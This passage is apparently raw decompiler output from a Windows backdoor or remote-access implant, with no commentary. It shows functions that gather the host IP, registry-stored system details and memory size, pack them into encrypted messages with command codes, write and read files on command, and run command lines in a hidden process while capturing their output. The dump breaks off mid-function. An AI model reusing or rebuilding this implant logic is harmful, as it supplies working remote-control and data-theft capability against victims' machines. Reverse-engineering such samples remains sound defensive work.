    "WCHAR *__fastcall sub_627428E0(_BYTE *a1, unsigned int a2)",
    "{",
    "  int v4; // eax",
    "  CHAR *v5; // rax",
    "  CHAR *v6; // rbx",
    "  WCHAR *v7; // rsi",
    "  int cchWideChar; // edi",
    "  WCHAR *lpWideCharStr; // rax",
    "",
    "  v4 = sub_62741510(a2);",
    "  v5 = (CHAR *)sub_62745B80(v4);",
    "  v6 = v5;",
    "  v7 = (WCHAR *)v5;",
    "  if ( v5 )",
    "  {",
    "    cchWideChar = (unsigned int)sub_62741530(v5, a1, a2);",
    "    lpWideCharStr = (WCHAR *)sub_62745B80(2LL * cchWideChar);",
    "    v7 = lpWideCharStr;",
    "    if ( lpWideCharStr )",
    "      MultiByteToWideChar(0, 0, v6, -1, lpWideCharStr, cchWideChar);",
    "    sub_62745BE0(v6);",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "CHAR *__fastcall sub_62742960(",
    "        _DWORD *a1,",
    "        _DWORD *a2,",
    "        const WCHAR *a3,",
    "        const WCHAR *a4,",
    "        const WCHAR *lpWideCharStr,",
    "        const WCHAR *a6,",
    "        const WCHAR *a7,",
    "        const char *a8,",
    "        int a9,",
    "        unsigned int *a10)",
    "{",
    "  CHAR *v13; // rbx",
    "  CHAR *v14; // rsi",
    "  CHAR *v15; // rbp",
    "  CHAR *v16; // r12",
    "  CHAR *v17; // r14",
    "  __int64 v18; // rax",
    "  _DWORD *v19; // r13",
    "  unsigned int v20; // eax",
    "  unsigned int v21; // edi",
    "  unsigned int v22; // eax",
    "  unsigned int v23; // edi",
    "  unsigned int v24; // eax",
    "  unsigned int v25; // edi",
    "  unsigned int v26; // eax",
    "  unsigned int v27; // edi",
    "  unsigned int v28; // eax",
    "  unsigned int v29; // r15d",
    "  _BYTE v31[344]; // [rsp+20h] [rbp-158h] BYREF",
    "",
    "  v13 = sub_627425A0(a3);",
    "  v14 = v13;",
    "  if ( v13 )",
    "  {",
    "    v14 = sub_627425A0(a4);",
    "    if ( v14 )",
    "    {",
    "      v15 = sub_627425A0(lpWideCharStr);",
    "      if ( v15 )",
    "      {",
    "        v16 = sub_627425A0(a6);",
    "        if ( v16 )",
    "        {",
    "          v17 = sub_627425A0(a7);",
    "          if ( v17 )",
    "          {",
    "            v18 = sub_62745B80(0x800u);",
    "            v19 = (_DWORD *)v18;",
    "            if ( v18 )",
    "            {",
    "              *(_DWORD *)(v18 + 4) = *a1;",
    "              *(_DWORD *)(v18 + 8) = a1[1];",
    "              *(_DWORD *)(v18 + 12) = 1;",
    "              *(_DWORD *)(v18 + 16) = *a2;",
    "              *(_DWORD *)(v18 + 20) = a2[1];",
    "              *(_DWORD *)(v18 + 24) = a2[2];",
    "              *(_DWORD *)(v18 + 28) = a2[3];",
    "              v20 = (unsigned int)sub_62741530((_BYTE *)(v18 + 72), v13, strlen(v13));",
    "              v19[8] = 72;",
    "              v19[9] = v20;",
    "              v21 = ((v20 + 3) & 0xFFFFFFFC) + 72;",
    "              v22 = (unsigned int)sub_62741530((_BYTE *)v19 + v21, v14, strlen(v14));",
    "              v19[10] = v21;",
    "              v19[11] = v22;",
    "              v23 = v21 + ((v22 + 3) & 0xFFFFFFFC);",
    "              v24 = (unsigned int)sub_62741530((_BYTE *)v19 + v23, v15, strlen(v15));",
    "              v19[12] = v23;",
    "              v19[13] = v24;",
    "              v25 = v23 + ((v24 + 3) & 0xFFFFFFFC);",
    "              v26 = (unsigned int)sub_62741530((_BYTE *)v19 + v25, v16, strlen(v16));",
    "              v19[14] = v25;",
    "              v19[15] = v26;",
    "              v27 = v25 + ((v26 + 3) & 0xFFFFFFFC);",
    "              v28 = (unsigned int)sub_62741530((_BYTE *)v19 + v27, v17, strlen(v17));",
    "              v19[16] = v27;",
    "              v19[17] = v28;",
    "              v29 = ((v28 + 3) & 0xFFFFFFFC) + v27;",
    "              *v19 = sub_62741E70(v19 + 1, v29 - 4, 0);",
    "              if ( a9 )",
    "              {",
    "                sub_62745FF0(v31, a8, strlen(a8));",
    "                sub_62746060(v31, v19, v19, v29);",
    "              }",
    "              *a10 = v29;",
    "            }",
    "            sub_62745BE0(v17);",
    "            v17 = (CHAR *)v19;",
    "          }",
    "          sub_62745BE0(v16);",
    "          v16 = v17;",
    "        }",
    "        sub_62745BE0(v15);",
    "        v15 = v16;",
    "      }",
    "      sub_62745BE0(v14);",
    "      v14 = v15;",
    "    }",
    "    sub_62745BE0(v13);",
    "  }",
    "  return v14;",
    "}",
    "",
    "",
    "int __fastcall sub_62742C40(char *Destination)",
    "{",
    "  struct hostent *v2; // rax",
    "  struct in_addr h_name; // esi",
    "  char *v4; // rax",
    "  char name[80]; // [rsp+20h] [rbp-208h] BYREF",
    "  struct WSAData WSAData; // [rsp+70h] [rbp-1B8h] BYREF",
    "",
    "  LODWORD(v2) = WSAStartup(0x101u, &WSAData);",
    "  if ( !(_DWORD)v2 )",
    "  {",
    "    LODWORD(v2) = gethostname(name, 80);",
    "    if ( (_DWORD)v2 != -1 )",
    "    {",
    "      v2 = gethostbyname(name);",
    "      if ( v2 )",
    "      {",
    "        v2 = (struct hostent *)*v2->h_addr_list;",
    "        if ( v2 )",
    "        {",
    "          h_name = (struct in_addr)v2->h_name;",
    "          GetModuleHandleW(0);",
    "          v4 = inet_ntoa(h_name);",
    "          LODWORD(v2) = (unsigned int)strcpy(Destination, v4);",
    "        }",
    "      }",
    "    }",
    "  }",
    "  return (int)v2;",
    "}",
    "",
    "",
    "_DWORD *__fastcall sub_62742CD0(_DWORD *a1, int a2, const char *a3, int a4, DWORD *a5)",
    "{",
    "  const WCHAR *v7; // rsi",
    "  DWORDLONG v8; // r14",
    "  CHAR *v9; // rsi",
    "  _DWORD *v10; // rbx",
    "  __int64 v11; // rax",
    "  unsigned int v12; // eax",
    "  unsigned int v13; // ebp",
    "  unsigned int v14; // eax",
    "  const WCHAR *v16; // r14",
    "  DWORD i; // ebx",
    "  _BYTE v18[264]; // [rsp+40h] [rbp-5E8h] BYREF",
    "  DWORD cbData; // [rsp+148h] [rbp-4E0h] BYREF",
    "  DWORD cchName; // [rsp+14Ch] [rbp-4DCh] BYREF",
    "  LPCWCH phkResult; // [rsp+150h] [rbp-4D8h] BYREF",
    "  LPCWCH hKey; // [rsp+158h] [rbp-4D0h] BYREF",
    "  struct _MEMORYSTATUSEX Buffer; // [rsp+160h] [rbp-4C8h] BYREF",
    "  tagVARIANT::$::$65D68C826D16CA47CF95571D7BFCD657::$E09503A454170B491AC1C4312CE36FE6 Data[2]; // [rsp+1A0h] [rbp-488h] BYREF",
    "  char Destination[32]; // [rsp+3B0h] [rbp-278h] BYREF",
    "  WCHAR Name[300]; // [rsp+3D0h] [rbp-258h] BYREF",
    "",
    "  Destination[0] = 0;",
    "  Data[0].iVal = 0;",
    "  sub_62742C40(Destination);",
    "  v7 = (const WCHAR *)sub_62746BA0(&unk_6274B3D0);",
    "  if ( !RegOpenKeyExW(HKEY_LOCAL_MACHINE, v7, 0, 0x108u, (PHKEY)&hKey) )",
    "  {",
    "    v16 = (const WCHAR *)sub_62746BA0(&unk_6274B438);",
    "    for ( i = 0; ; ++i )",
    "    {",
    "      cchName = 260;",
    "      if ( RegEnumKeyExW((HKEY)hKey, i, Name, &cchName, 0, 0, 0, 0) )",
    "        break;",
    "      if ( !RegOpenKeyExW((HKEY)hKey, Name, 0, 0x101u, (PHKEY)&phkResult) )",
    "      {",
    "        cbData = 260;",
    "        if ( !RegQueryValueExW((HKEY)phkResult, v16, 0, 0, (LPBYTE)Data, &cbData) )",
    "        {",
    "          *(&Data[0].bVal + cbData) = 0;",
    "          *((_BYTE *)&Data[0].llVal + cbData + 1) = 0;",
    "          break;",
    "        }",
    "        RegCloseKey((HKEY)phkResult);",
    "      }",
    "    }",
    "    sub_62746C30(v16);",
    "    RegCloseKey((HKEY)hKey);",
    "  }",
    "  sub_62746C30(v7);",
    "  Buffer.dwLength = 64;",
    "  LODWORD(v8) = 0;",
    "  if ( GlobalMemoryStatusEx(&Buffer) )",
    "    v8 = Buffer.ullTotalPhys >> 20;",
    "  v9 = sub_627425A0((LPCWCH)Data);",
    "  v10 = v9;",
    "  if ( v9 )",
    "  {",
    "    v11 = sub_62745B80(0x800u);",
    "    v10 = (_DWORD *)v11;",
    "    if ( v11 )",
    "    {",
    "      *(_DWORD *)(v11 + 4) = *a1;",
    "      *(_DWORD *)(v11 + 8) = a1[1];",
    "      *(_DWORD *)(v11 + 12) = 2;",
    "      *(_DWORD *)(v11 + 16) = 1;",
    "      *(_DWORD *)(v11 + 20) = a2;",
    "      v12 = (unsigned int)sub_62741530((_BYTE *)(v11 + 44), Destination, strlen(Destination));",
    "      v10[6] = 44;",
    "      v10[7] = v12;",
    "      v13 = ((v12 + 3) & 0xFFFFFFFC) + 44;",
    "      v14 = (unsigned int)sub_62741530((_BYTE *)v10 + v13, v9, strlen(v9));",
    "      v10[8] = v13;",
    "      v10[9] = v14;",
    "      v10[10] = v8;",
    "      cbData = ((v14 + 3) & 0xFFFFFFFC) + v13;",
    "      *v10 = sub_62741E70(v10 + 1, cbData - 4, 0);",
    "      if ( a4 )",
    "      {",
    "        sub_62745FF0(v18, a3, strlen(a3));",
    "        sub_62746060(v18, v10, v10, cbData);",
    "      }",
    "      *a5 = cbData;",
    "    }",
    "    sub_62745BE0(v9);",
    "  }",
    "  return v10;",
    "}",
    "",
    "",
    "_DWORD *__fastcall sub_62743070(_DWORD *a1, int a2, const char *a3, int a4, _DWORD *a5)",
    "{",
    "  _DWORD *v9; // rsi",
    "  _DWORD *v10; // rbx",
    "  _DWORD *v11; // rax",
    "  int v12; // edi",
    "  unsigned int v13; // edi",
    "  _BYTE v15[268]; // [rsp+20h] [rbp-148h] BYREF",
    "  LONGLONG Size[7]; // [rsp+12Ch] [rbp-3Ch] BYREF",
    "",
    "  v9 = (_DWORD *)sub_627460D0(Size);",
    "  v10 = v9;",
    "  if ( v9 )",
    "  {",
    "    v11 = (_DWORD *)sub_62745B80((unsigned int)(LODWORD(Size[0]) + 1024));",
    "    v10 = v11;",
    "    if ( v11 )",
    "    {",
    "      v11[1] = *a1;",
    "      v11[2] = a1[1];",
    "      v11[3] = 2;",
    "      v11[4] = 2;",
    "      v11[5] = a2;",
    "      v12 = Size[0];",
    "      memcpy(v11 + 8, v9, LODWORD(Size[0]));",
    "      v10[6] = 32;",
    "      v10[7] = v12;",
    "      v13 = (v12 + 3) & 0xFFFFFFFC;",
    "      LODWORD(Size[0]) = v13 + 32;",
    "      *v10 = sub_62741E70(v10 + 1, v13 + 28, 0);",
    "      if ( a4 )",
    "      {",
    "        GetModuleHandleW(0);",
    "        sub_62745FF0(v15, a3, strlen(a3));",
    "        sub_62746060(v15, v10, v10, LODWORD(Size[0]));",
    "      }",
    "      *a5 = Size[0];",
    "    }",
    "    sub_62745BE0(v9);",
    "  }",
    "  return v10;",
    "}",
    "",
    "",
    "char *__fastcall sub_627431B0(_DWORD *a1)",
    "{",
    "  const WCHAR *v1; // r15",
    "  char *v2; // rsi",
    "  char *v3; // rax",
    "  const WCHAR *v4; // r14",
    "  DWORD i; // ebx",
    "  CHAR *v7; // r13",
    "  CHAR *v8; // r13",
    "  CHAR *v9; // r13",
    "  char *v10; // [rsp+40h] [rbp-5C8h]",
    "  const WCHAR *lpValueName; // [rsp+48h] [rbp-5C0h]",
    "  const WCHAR *v12; // [rsp+50h] [rbp-5B8h]",
    "  char *v13; // [rsp+58h] [rbp-5B0h]",
    "  DWORD cbData; // [rsp+78h] [rbp-590h] BYREF",
    "  DWORD cchName; // [rsp+7Ch] [rbp-58Ch] BYREF",
    "  LPCWCH phkResult; // [rsp+80h] [rbp-588h] BYREF",
    "  LPCWCH hKey; // [rsp+88h] [rbp-580h] BYREF",
    "  char Source[272]; // [rsp+90h] [rbp-578h] BYREF",
    "  WCHAR Data[264]; // [rsp+1A0h] [rbp-468h] BYREF",
    "  WCHAR Name[300]; // [rsp+3B0h] [rbp-258h] BYREF",
    "",
    "  v1 = (const WCHAR *)sub_62746BA0(&unk_6274B468);",
    "  v2 = 0;",
    "  if ( !RegOpenKeyExW(HKEY_LOCAL_MACHINE, v1, 0, 0x108u, (PHKEY)&hKey) )",
    "  {",
    "    v3 = (char *)sub_62745B80(0x40000u);",
    "    v2 = v3;",
    "    if ( v3 )",
    "    {",
    "      *v3 = 0;",
    "      v4 = (const WCHAR *)sub_62746BA0(&unk_6274B4D8);",
    "      lpValueName = (const WCHAR *)sub_62746BA0(&unk_6274B4F8);",
    "      v12 = (const WCHAR *)sub_62746BA0(&unk_6274B520);",
    "      v10 = (char *)sub_62746B10(&unk_6274B53F);",
    "      v13 = (char *)sub_62746B10(&unk_6274B549);",
    "      for ( i = 0; ; ++i )",
    "      {",
    "        cchName = 260;",
    "        if ( RegEnumKeyExW((HKEY)hKey, i, Name, &cchName, 0, 0, 0, 0) )",
    "          break;",
    "        if ( !RegOpenKeyExW((HKEY)hKey, Name, 0, 0x101u, (PHKEY)&phkResult) )",
    "        {",
    "          cbData = 260;",
    "          if ( !RegQueryValueExW((HKEY)phkResult, v4, 0, 0, (LPBYTE)Data, &cbData) )",
    "          {",
    "            *((_BYTE *)Data + cbData) = 0;",
    "            *((_BYTE *)Data + cbData + 1) = 0;",
    "            v7 = sub_627425A0(Data);",
    "            if ( v7 )",
    "            {",
    "              if ( *v2 && i )",
    "                strcat(v2, v10);",
    "              sub_62741530(Source, v7, strlen(v7));",
    "              strcat(v2, Source);",
    "              sub_62745BE0(v7);",
    "            }",
    "            cbData = 260;",
    "            if ( RegQueryValueExW((HKEY)phkResult, lpValueName, 0, 0, (LPBYTE)Data, &cbData) )",
    "            {",
    "              strcat(v2, v10);",
    "              strcat(v2, v13);",
    "            }",
    "            else",
    "            {",
    "              *((_BYTE *)Data + cbData) = 0;",
    "              *((_BYTE *)Data + cbData + 1) = 0;",
    "              v9 = sub_627425A0(Data);",
    "              if ( v9 )",
    "              {",
    "                strcat(v2, v10);",
    "                sub_62741530(Source, v9, strlen(v9));",
    "                strcat(v2, Source);",
    "                sub_62745BE0(v9);",
    "              }",
    "            }",
    "            cbData = 260;",
    "            if ( RegQueryValueExW((HKEY)phkResult, v12, 0, 0, (LPBYTE)Data, &cbData) )",
    "            {",
    "              strcat(v2, v10);",
    "              strcat(v2, v13);",
    "            }",
    "            else",
    "            {",
    "              *((_BYTE *)Data + cbData) = 0;",
    "              *((_BYTE *)Data + cbData + 1) = 0;",
    "              v8 = sub_627425A0(Data);",
    "              if ( v8 )",
    "              {",
    "                strcat(v2, v10);",
    "                sub_62741530(Source, v8, strlen(v8));",
    "                strcat(v2, Source);",
    "                sub_62745BE0(v8);",
    "              }",
    "            }",
    "          }",
    "          RegCloseKey((HKEY)phkResult);",
    "        }",
    "      }",
    "      *a1 = strlen(v2) + 1;",
    "      sub_62746C30(v13);",
    "      sub_62746C30(v10);",
    "      sub_62746C30(v12);",
    "      sub_62746C30(lpValueName);",
    "      sub_62746C30(v4);",
    "    }",
    "    RegCloseKey((HKEY)hKey);",
    "  }",
    "  sub_62746C30(v1);",
    "  return v2;",
    "}",
    "",
    "",
    "char *__fastcall sub_62743670(_DWORD *a1, int a2, const char *a3, int a4, _DWORD *a5)",
    "{",
    "  char *v9; // rsi",
    "  char *v10; // rbx",
    "  char *v11; // rax",
    "  int v12; // edi",
    "  unsigned int v13; // edi",
    "  _BYTE v15[268]; // [rsp+20h] [rbp-148h] BYREF",
    "  size_t Size[7]; // [rsp+12Ch] [rbp-3Ch] BYREF",
    "",
    "  v9 = sub_627431B0(Size);",
    "  v10 = v9;",
    "  if ( v9 )",
    "  {",
    "    v11 = (char *)sub_62745B80((unsigned int)(LODWORD(Size[0]) + 1024));",
    "    v10 = v11;",
    "    if ( v11 )",
    "    {",
    "      *((_DWORD *)v11 + 1) = *a1;",
    "      *((_DWORD *)v11 + 2) = a1[1];",
    "      *((_DWORD *)v11 + 3) = 2;",
    "      *((_DWORD *)v11 + 4) = 3;",
    "      *((_DWORD *)v11 + 5) = a2;",
    "      v12 = Size[0];",
    "      memcpy(v11 + 32, v9, LODWORD(Size[0]));",
    "      *((_DWORD *)v10 + 6) = 32;",
    "      *((_DWORD *)v10 + 7) = v12;",
    "      v13 = (v12 + 3) & 0xFFFFFFFC;",
    "      LODWORD(Size[0]) = v13 + 32;",
    "      *(_DWORD *)v10 = sub_62741E70(v10 + 4, v13 + 28, 0);",
    "      if ( a4 )",
    "      {",
    "        sub_62745FF0(v15, a3, strlen(a3));",
    "        sub_62746060(v15, v10, v10, LODWORD(Size[0]));",
    "      }",
    "      *a5 = Size[0];",
    "    }",
    "    sub_62745BE0(v9);",
    "  }",
    "  return v10;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_627437A0(__int64 a1, const void *a2, DWORD a3)",
    "{",
    "  _PROCESS_INFORMATION *v5; // rax",
    "  _PROCESS_INFORMATION *v6; // rbx",
    "  unsigned int v7; // esi",
    "  WCHAR *v8; // rax",
    "  WCHAR *v9; // rdi",
    "  HANDLE FileW; // rax",
    "  void *v11; // r13",
    "  DWORD NumberOfBytesWritten; // [rsp+4Ch] [rbp-3Ch] BYREF",
    "",
    "  v5 = (_PROCESS_INFORMATION *)sub_62742820(a1);",
    "  v6 = v5;",
    "  v7 = 0;",
    "  if ( v5 )",
    "  {",
    "    v8 = sub_62742640(v5);",
    "    v9 = v8;",
    "    if ( v8 )",
    "    {",
    "      FileW = CreateFileW(v8, 0x40000000u, 0, 0, 2u, 0x80u, 0);",
    "      v11 = FileW;",
    "      if ( FileW != (HANDLE)-1LL )",
    "      {",
    "        SetFilePointer(FileW, 0, 0, 0);",
    "        v7 = WriteFile(v11, a2, a3, &NumberOfBytesWritten, 0);",
    "        if ( v7 )",
    "          v7 = NumberOfBytesWritten == a3;",
    "        CloseHandle(v11);",
    "      }",
    "      sub_62745BE0(v9);",
    "    }",
    "    sub_62745BE0(v6);",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "_DWORD *__fastcall sub_62743890(",
    "        _DWORD *a1,",
    "        int a2,",
    "        __int64 a3,",
    "        const void *a4,",
    "        DWORD a5,",
    "        const char *a6,",
    "        int a7,",
    "        unsigned int *a8)",
    "{",
    "  int v10; // edi",
    "  _DWORD *v11; // rax",
    "  _DWORD *v12; // rbx",
    "  char *v13; // rbp",
    "  unsigned int v14; // esi",
    "  unsigned int v15; // esi",
    "  unsigned int v16; // ebp",
    "  _BYTE v18[312]; // [rsp+20h] [rbp-138h] BYREF",
    "",
    "  v10 = sub_627437A0(a3, a4, a5);",
    "  v11 = (_DWORD *)sub_62745B80(0x400u);",
    "  v12 = v11;",
    "  if ( v11 )",
    "  {",
    "    v11[1] = *a1;",
    "    v11[2] = a1[1];",
    "    v11[3] = 2;",
    "    v11[4] = 5;",
    "    v11[5] = a2;",
    "    if ( v10 )",
    "      v13 = (char *)sub_62746B10(&unk_6274B553);",
    "    else",
    "      v13 = (char *)sub_62746B10(&unk_6274B560);",
    "    v14 = (unsigned int)sub_62741530((_BYTE *)v12 + 32, v13, strlen(v13));",
    "    sub_62746C30(v13);",
    "    v12[6] = 32;",
    "    v12[7] = v14;",
    "    v15 = (v14 + 3) & 0xFFFFFFFC;",
    "    v16 = v15 + 32;",
    "    *v12 = sub_62741E70(v12 + 1, v15 + 28, 0);",
    "    if ( a7 )",
    "    {",
    "      sub_62745FF0(v18, a6, strlen(a6));",
    "      sub_62746060(v18, v12, v12, v16);",
    "    }",
    "    *a8 = v16;",
    "  }",
    "  return v12;",
    "}",
    "",
    "",
    "void *__fastcall sub_627439E0(__int64 a1, DWORD *a2)",
    "{",
    "  _PROCESS_INFORMATION *v3; // rax",
    "  _PROCESS_INFORMATION *v4; // rbx",
    "  void *v5; // rsi",
    "  WCHAR *v6; // rax",
    "  HANDLE FileW; // rax",
    "  void *v8; // rdi",
    "  void *v9; // r12",
    "  DWORD v10; // eax",
    "  DWORD v11; // r13d",
    "  DWORD NumberOfBytesRead; // [rsp+4Ch] [rbp-3Ch] BYREF",
    "",
    "  v3 = (_PROCESS_INFORMATION *)sub_62742820(a1);",
    "  v4 = v3;",
    "  v5 = v3;",
    "  if ( v3 )",
    "  {",
    "    v6 = sub_62742640(v3);",
    "    v5 = v6;",
    "    if ( v6 )",
    "    {",
    "      FileW = CreateFileW(v6, 0x80000000, 7u, 0, 3u, 0x80u, 0);",
    "      v8 = FileW;",
    "      v9 = 0;",
    "      if ( FileW != (HANDLE)-1LL )",
    "      {",
    "        v10 = SetFilePointer(FileW, 0, 0, 2u);",
    "        v11 = v10;",
    "        if ( v10 <= 0x40000000 )",
    "        {",
    "          v9 = (void *)sub_62745B80(v10);",
    "          if ( v9 )",
    "          {",
    "            SetFilePointer(v8, 0, 0, 0);",
    "            if ( ReadFile(v8, v9, v11, &NumberOfBytesRead, 0) && NumberOfBytesRead == v11 )",
    "            {",
    "              if ( a2 )",
    "                *a2 = v11;",
    "            }",
    "            else",
    "            {",
    "              sub_62745BE0(v9);",
    "              v9 = 0;",
    "            }",
    "          }",
    "        }",
    "        CloseHandle(v8);",
    "      }",
    "      sub_62745BE0(v5);",
    "      v5 = v9;",
    "    }",
    "    sub_62745BE0(v4);",
    "  }",
    "  return v5;",
    "}",
    "",
    "",
    "_DWORD *__fastcall sub_62743B20(_DWORD *a1, int a2, __int64 a3, const char *a4, int a5, unsigned int *a6)",
    "{",
    "  void *v9; // rbp",
    "  _DWORD *v10; // rax",
    "  _DWORD *v11; // rbx",
    "  char *v12; // r13",
    "  unsigned int v13; // esi",
    "  unsigned int v14; // esi",
    "  int v15; // edi",
    "  unsigned int v16; // esi",
    "  char *v18; // r13",
    "  unsigned int v19; // esi",
    "  _BYTE v20[268]; // [rsp+20h] [rbp-148h] BYREF",
    "  size_t Size[7]; // [rsp+12Ch] [rbp-3Ch] BYREF",
    "",
    "  LODWORD(Size[0]) = 0;",
    "  v9 = sub_627439E0(a3, (DWORD *)Size);",
    "  v10 = (_DWORD *)sub_62745B80((unsigned int)(LODWORD(Size[0]) + 1024));",
    "  v11 = v10;",
    "  if ( v10 )",
    "  {",
    "    v10[1] = *a1;",
    "    v10[2] = a1[1];",
    "    v10[3] = 2;",
    "    v10[4] = 6;",
    "    v10[5] = a2;",
    "    if ( v9 )",
    "    {",
    "      v12 = (char *)sub_62746B10(&unk_6274B581);",
    "      v13 = (unsigned int)sub_62741530((_BYTE *)v11 + 40, v12, strlen(v12));",
    "      sub_62746C30(v12);",
    "      v11[6] = 40;",
    "      v11[7] = v13;",
    "      v14 = ((v13 + 3) & 0xFFFFFFFC) + 40;",
    "      v15 = Size[0];",
    "      memcpy((char *)v11 + v14, v9, LODWORD(Size[0]));",
    "      v11[8] = v14;",
    "      v11[9] = v15;",
    "    }",
    "    else",
    "    {",
    "      v18 = (char *)sub_62746B10(&unk_6274B5A0);",
    "      v19 = (unsigned int)sub_62741530((_BYTE *)v11 + 40, v18, strlen(v18));",
    "      sub_62746C30(v18);",
    "      v11[6] = 40;",
    "      v11[7] = v19;",
    "      v14 = ((v19 + 3) & 0xFFFFFFFC) + 40;",
    "      v15 = Size[0];",
    "      v11[8] = 0;",
    "      v11[9] = 0;",
    "    }",
    "    v16 = ((v15 + 3) & 0xFFFFFFFC) + v14;",
    "    *v11 = sub_62741E70(v11 + 1, v16 - 4, 0);",
    "    if ( a5 )",
    "    {",
    "      sub_62745FF0(v20, a4, strlen(a4));",
    "      sub_62746060(v20, v11, v11, v16);",
    "    }",
    "    *a6 = v16;",
    "  }",
    "  if ( v9 )",
    "    sub_62745BE0(v9);",
    "  return v11;",
    "}",
    "",
    "",
    "__int64 sub_62743D10()",
    "{",
    "  const wchar_t *v0; // rbx",
    "  const wchar_t *v2; // rdi",
    "  unsigned int v3; // esi",
    "  const wchar_t *v4; // rbx",
    "  unsigned __int64 v5; // rdx",
    "  __int64 v6; // rax",
    "  __int64 v7; // rcx",
    "  __int64 v8; // r8",
    "  int v9; // ecx",
    "  wchar_t v10; // dx",
    "  __int64 v11; // rax",
    "  wchar_t String[276]; // [rsp+20h] [rbp-228h] BYREF",
    "",
    "  v0 = (const wchar_t *)((__int64 (*)(void))sub_627427E0)();",
    "  if ( wcslen(v0) <= 1 )",
    "    return 0;",
    "  v2 = (const wchar_t *)sub_62746BA0(&unk_6274B5C0);",
    "  v3 = wcsnicmp(v0, v2, 2u);",
    "  if ( !v3 )",
    "  {",
    "    v4 = (const wchar_t *)sub_627427E0(v0 + 2);",
    "    if ( !wcslen(v4) )",
    "      goto LABEL_5;",
    "    String[0] = 0;",
    "    v5 = *v4;",
    "    if ( (_WORD)v5 == 34 )",
    "    {",
    "      v10 = v4[1];",
    "      if ( !v10 || v10 == 34 )",
    "      {",
    "        v9 = v3;",
    "      }",
    "      else",
    "      {",
    "        v11 = 1;",
    "        do",
    "        {",
    "          String[v11 - 1] = v10;",
    "          v9 = v11;",
    "          v10 = v4[++v11];",
    "        }",
    "        while ( v10 && v10 != 34 );",
    "      }",
    "    }",
    "    else",
    "    {",
    "      if ( (unsigned __int16)v5 > 0x20u )",
    "      {",
    "        v6 = 1;",
    "LABEL_10:",
    "        v8 = 0x100002601LL;",
    "        do",
    "        {",
    "          while ( 1 )",
    "          {",
    "            String[v6 - 1] = v5;",
    "            v9 = v6;",
    "            v5 = v4[v6];",
    "            if ( (unsigned __int16)v5 <= 0x20u )",
    "              break;",
    "            ++v6;",
    "          }",
    "          ++v6;",
    "        }",
    "        while ( !_bittest64(&v8, v5) );",
    "        goto LABEL_13;",
    "      }",
    "      v6 = 1;",
    "      v7 = 0x100002601LL;",
    "      if ( !_bittest64(&v7, v5) )",
    "        goto LABEL_10;",
    "      v9 = v3;",
    "    }",
    "LABEL_13:",
    "    String[v9] = 0;",
    "    if ( wcslen(String) )",
    "      v3 = SetCurrentDirectoryW(String);",
    "    goto LABEL_5;",
    "  }",
    "  v3 = 0;",
    "LABEL_5:",
    "  sub_62746C30(v2);",
    "  return v3;",
    "}",
    "",
    "",
    "WCHAR *__fastcall sub_62743EA0(_DWORD *a1, int a2, _PROCESS_INFORMATION *a3, const char *a4, int a5, DWORD *a6)",
    "{",
    "  WCHAR *v9; // rbx",
    "  WCHAR *v10; // rax",
    "  size_t v11; // rdi",
    "  wchar_t *v12; // r12",
    "  const wchar_t *v13; // r13",
    "  char *v14; // r13",
    "  int v16; // edi",
    "  char *v17; // rax",
    "  char *v18; // r14",
    "  WCHAR *v19; // rax",
    "  CHAR *v20; // r15",
    "  CHAR *v21; // r13",
    "  unsigned __int64 v22; // kr08_8",
    "  char *v23; // rax",
    "  const char *v24; // rdi",
    "  __int64 v25; // rax",
    "  _DWORD *v26; // rdi",
    "  unsigned int v27; // eax",
    "  unsigned int v28; // eax",
    "  int v29; // [rsp+58h] [rbp-430h]",
    "  char *v30; // [rsp+58h] [rbp-430h]",
    "  _BYTE v31[272]; // [rsp+60h] [rbp-428h] BYREF",
    "  WCHAR Buffer[260]; // [rsp+170h] [rbp-318h] BYREF",
    "  DWORD NumberOfBytesRead; // [rsp+378h] [rbp-110h] BYREF",
    "  DWORD TotalBytesAvail; // [rsp+37Ch] [rbp-10Ch] BYREF",
    "  HANDLE hWritePipe; // [rsp+380h] [rbp-108h] BYREF",
    "  HANDLE hReadPipe; // [rsp+388h] [rbp-100h] BYREF",
    "  _SECURITY_ATTRIBUTES PipeAttributes; // [rsp+390h] [rbp-F8h] BYREF",
    "  struct _PROCESS_INFORMATION ProcessInformation; // [rsp+3B0h] [rbp-D8h] BYREF",
    "  struct _STARTUPINFOW StartupInfo; // [rsp+3D0h] [rbp-B8h] BYREF",
    "",
    "  *(_QWORD *)&PipeAttributes.nLength = 24;",
    "  PipeAttributes.lpSecurityDescriptor = 0;",
    "  *(_QWORD *)&PipeAttributes.bInheritHandle = 1;",
    "  v9 = 0;",
    "  if ( CreatePipe(&hReadPipe, &hWritePipe, &PipeAttributes, 0x100000u) )",
    "  {",
    "    SetHandleInformation(hReadPipe, 1u, 0);",
    "    memset(&StartupInfo, 0, 0x58u);",
    "    memset(&ProcessInformation, 0, sizeof(ProcessInformation));",
    "    StartupInfo.cb = 104;",
    "    StartupInfo.hStdError = hWritePipe;",
    "    StartupInfo.hStdOutput = hWritePipe;",
    "    StartupInfo.dwFlags = 256;",
    "    v10 = sub_62742640(a3);",
    "    v9 = v10;",
    "    if ( v10 )",
    "    {",
    "      v11 = wcslen(v10) + 1025;",
    "      v12 = (wchar_t *)sub_62745B80(2 * v11);",
    "      if ( v12 )",
    "      {",
    "        v13 = (const wchar_t *)sub_62746BA0(&unk_6274B5D0);",
    "        sub_62742580(v12, v11, v13, v9);",
    "        sub_62746C30(v13);",
    "        GetCurrentDirectoryW(0x104u, Buffer);",
    "        v14 = 0;",
    "        if ( CreateProcessW(0, v12, 0, 0, 1, 0x8000000u, 0, Buffer, &StartupInfo, &ProcessInformation) )",
    "        {",
    "          WaitForSingleObject(ProcessInformation.hProcess, 0x1388u);",
    "          v29 = sub_62743D10();",
    "          TotalBytesAvail = 0;",
    "          GetModuleHandleW(0);",
    "          v16 = 52;",
    "          while ( PeekNamedPipe(hReadPipe, 0, 0, 0, &TotalBytesAvail, 0) )",
    "          {",
    "            if ( TotalBytesAvail )",
    "              goto LABEL_18;",
    "            GetModuleHandleW(0);",
    "            if ( !--v16 )",
    "              break;",
    "            Sleep(0x64u);",
    "          }",
    "          if ( TotalBytesAvail )",
    "          {",
    "LABEL_18:",
    "            v17 = (char *)sub_62745B80(TotalBytesAvail + 1);",
    "            v14 = v17;",
    "            if ( !v17 )",
    "              goto LABEL_17;",
    "            ReadFile(hReadPipe, v17, TotalBytesAvail, &NumberOfBytesRead, 0);",
    "            v18 = v14;",
    "            goto LABEL_20;",
